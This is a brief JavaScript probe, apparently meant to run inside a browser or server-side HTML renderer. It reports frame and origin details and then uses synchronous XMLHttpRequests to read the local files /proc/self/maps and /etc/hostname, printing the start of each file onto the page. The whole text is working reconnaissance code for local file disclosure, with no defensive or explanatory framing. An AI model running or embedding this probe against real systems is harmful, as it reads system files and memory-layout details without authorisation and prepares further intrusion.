var o=document.getElementById('o');
function w(s){o.textContent+='\n'+s;}
w('JS-OK TOP='+(window.top===window)+' ORIGIN='+location.origin+' RS='+document.readyState);
var m=window.getMatchedCSSRules(document.documentElement); w('MATCH='+(m?m.length:'null'));
function fx(u,t){try{var x=new XMLHttpRequest();x.open('GET',u,false);x.send();w(t+' len='+x.responseText.length+' head='+JSON.stringify(x.responseText.slice(0,40)));}catch(e){w(t+' ERR '+e);}}
fx('file:///proc/self/maps','FMAPS');
fx('file:///etc/hostname','FHOST');